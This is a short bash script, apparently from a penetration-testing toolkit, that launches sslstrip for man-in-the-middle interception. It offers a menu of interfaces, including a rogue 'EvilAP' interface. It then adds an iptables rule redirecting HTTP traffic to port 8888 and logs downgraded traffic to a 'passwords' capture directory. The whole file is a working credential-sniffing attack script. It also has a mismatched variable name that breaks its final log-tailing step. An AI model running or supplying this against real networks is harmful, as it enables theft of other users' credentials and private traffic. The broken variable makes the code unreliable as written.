#!/bin/bash
#SSLstripp script for sniffing on available interfaces

##################################################
f_interface(){
  clear
  echo "Select which interface you would like to sniff on? (1-6):"
  echo
  echo "1. eth0  (USB ethernet adapter)"
  echo "2. wlan0  (Internal Nexus Wifi)"
  echo "3. wlan1  (USB TPlink Atheros)"
  echo "4. mon0  (monitor mode interface)"
  echo "5. at0  (Use with EvilAP)"
  echo "6. rmnet_usb0 (Internal 3G GSM)"
  echo

  read -p "Choice: " interfacechoice

  case $interfacechoice in
    1) interface=eth0 ;;
    2) interface=wlan0 ;;
    3) interface=wlan1 ;;
    4) interface=mon0 ;;
    5) interface=at0 ;;
    6) interface=rmnet_usb0 ;;
    *) f_interface ;;
esac
}


#Setup IPtables for ssltrip
f_ip_tables(){
  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
}

f_logfile(){
  echo "sslstrip$(date +%F-%H%M).log"
}

f_run(){
  #Path to sslstrip definitions:
  clear
  echo
  echo  "Logging to /opt/pwnix/captures/passwords/"
  echo
  sleep 2

  f_interface
  f_ip_tables

  sslstrip_filename=$(f_logfile)
  sslstrip -pfk -w /opt/pwnix/captures/passwords/$sslstrip_filename  -l 8888 $interface &

  sleep 3
  echo
  echo
  tail -f /opt/pwnix/captures/passwords/$ssl_stripfilename
}

f_run

